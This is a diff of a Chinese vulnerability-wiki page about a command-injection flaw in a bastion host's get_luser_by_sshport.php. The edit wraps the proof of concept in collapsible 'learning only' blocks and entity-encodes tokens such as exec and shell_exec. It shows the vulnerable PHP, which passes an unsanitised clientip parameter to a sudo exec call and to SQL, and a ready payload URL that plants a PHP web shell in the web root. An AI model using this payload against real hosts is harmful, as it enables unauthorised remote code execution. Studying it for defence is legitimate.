@@ -35,27 +35,30 @@ cert.subject="Baolei"
 
 出现漏洞的文件为 get_luser_by_sshport.php
 
-```
-<?php
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">&lt;?php
 define('CAN_RUN', 1);
 require_once('include/global.func.php');
 require_once('include/db_connect.inc.php');
-if(empty($_GET['clientip'])){
+if(empty(&#36;_GET['clientip'])){
 	echo 'no host';
 	return;
 }
-if(empty($_GET['clientport'])){
+if(empty(&#36;_GET['clientport'])){
 	echo 'no port';
 	return;
 }
-$cmd = 'sudo perl test.pl '.$_GET['clientip'].' '.$_GET['clientport'];
-exec($cmd, $o, $r);
- $sql = "SELECT luser FROM sessions WHERE addr='".$_GET['clientip']."' and pid='".$o[0]."' order by sid desc limit 1";
+$cmd = 'sudo perl test.pl '.&#36;_GET['clientip'].' '.&#36;_GET['clientport'];
+&#101;xec($cmd, $o, $r);
+ $sql = "SELECT luser FROM sessions WHERE addr='".&#36;_GET['clientip']."' and pid='".$o[0]."' order by sid desc limit 1";
 $rs = mysql_query($sql);
 $row = mysql_fetch_array($rs);
 echo $row['luser'];
-?>
-```
+?&gt;</code></pre>
+
+</details>
 
 其中 clientip存在命令拼接 使用 ; 分割命令就可以执行任意命令
 
@@ -63,9 +66,12 @@ Web目录默认为 `/opt/freesvr/web/htdocs/freesvr/audit/`
 
 发送Payload
 
-```
-https://xxx.xxx.xxx.xxx/get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(shell_exec($_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/test.php;&clientport=1
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">https://xxx.xxx.xxx.xxx/get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(&#115;hell_&#101;xec(&#36;_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/test.php;&amp;clientport=1</code></pre>
+
+</details>
 
 ![image-20220525100301367](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205251003398.png)
 
